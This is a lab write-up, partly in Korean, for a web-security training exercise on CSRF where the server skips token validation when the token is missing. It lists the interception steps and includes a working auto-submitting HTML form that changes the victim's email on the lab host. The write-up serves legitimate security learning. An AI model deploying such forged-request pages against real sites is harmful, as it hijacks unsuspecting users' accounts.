# 🚩Lab: CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인한다.
2. 이메일을 변경하는 요청을 프록시로 가로챈다.
3. 리피터로 이동후 `csrf토큰`을 지워서 전송해본다.
4. 성공적으로 이메일이 변경되는 것을 확인할 수 있다.
5. CSRF토큰이 존재하지 않을 때 검증이 우회되고 있다.
6. 따라서 csrf토큰을 포함하지 않고 변경 이메일만 포함시켜 전송하는 폼을 포함하는 HTML페이지를 만들어 exploit 서버로 전송하면 된다.
```html
<form action="https://0a050053031387298315aad60058004c.web-security-academy.net/my-account/change-email" method="POST">
    <input name="email" value="a@d">
</form>
<script>
    document.forms[0].submit();
</script>
```
7. solve
                        
### 💡 취약점 원리
 CSRF 토큰이 존재할 경우에는 검증을 진행하고 있으나, CSRF값을 포함시키지 않은 요청을 보낼 경우 검증이 통과되는 경우
